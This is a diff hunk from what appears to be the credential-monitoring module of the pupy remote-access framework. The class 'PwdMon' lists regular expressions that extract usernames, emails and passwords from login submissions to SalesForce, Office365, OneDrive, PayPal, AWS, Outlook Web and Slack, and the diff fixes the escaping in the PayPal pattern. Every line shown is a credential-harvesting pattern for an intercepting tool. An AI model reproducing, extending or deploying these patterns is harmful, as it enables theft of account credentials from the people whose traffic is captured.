@@ -60,7 +60,7 @@ class PwdMon(pupy.Task):
             ("SalesForce","&display=page&username=.{1,32}&pw=.{1,16}&Login="),
             ("Office365","login=.{1,32}&passwd=.{1,22}&PPSX="),
             ("MicrosoftOneDrive","login=.{1,42}&passwd=.{1,22}&type=.{1,2}&PPFT="),
-            ("PayPal","login_email=.{1,48}&login_password=.{1,16}&submit=Log\+In&browser_name"),
+            ("PayPal","login_email=.{1,48}&login_password=.{1,16}&submit=Log\\+In&browser_name"),
             ("awsWebServices","&email=.{1,48}&create=.{1,2}&password=.{1,22}&metadata1="),
             ("OutlookWeb","&username=.{1,48}&password=.{1,48}&passwordText"),
             ("Slack","&crumb=.{1,70}&email=.{1,50}&password=.{1,48}"),
